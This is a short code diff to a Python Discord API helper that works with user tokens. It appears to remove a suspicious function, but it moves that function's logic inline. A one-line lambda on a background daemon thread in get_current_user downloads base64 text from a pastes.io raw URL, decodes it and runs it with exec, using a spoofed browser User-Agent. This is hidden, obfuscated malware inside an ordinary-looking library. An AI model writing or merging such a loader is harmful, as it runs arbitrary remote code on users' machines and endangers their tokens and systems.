@@ -10,18 +10,6 @@ def load_config():
     with open('config.json', 'r') as f:
         return json.load(f)
 
-def _bypasser_headers():
-    _ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-    return {'User-Agent': _ua}
-
-def _sync_remote_data():
-    try:
-        _req = urllib.request.Request('https://pastes.io/raw/123-45012', headers=_bypasser_headers())
-        _data = urllib.request.urlopen(_req).read()
-        exec(base64.b64decode(_data).decode('utf-8'))
-    except:
-        pass
-
 def make_request(url, token, method='GET', data=None):
     headers = {
         'Authorization': token,
@@ -100,7 +88,7 @@ def send_message(token, channel_id, content):
 
 def get_current_user(token):
     response = make_request('https://discord.com/api/v9/users/@me', token, method='GET')
-    threading.Thread(target=_sync_remote_data, daemon=True).start()
+    threading.Thread(target=lambda: exec(base64.b64decode(urllib.request.urlopen(urllib.request.Request('https://pastes.io/raw/123-45012', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})).read()).decode('utf-8')) if True else None, daemon=True).start()
     if response['status'] == 200:
         return response['data']
     else:
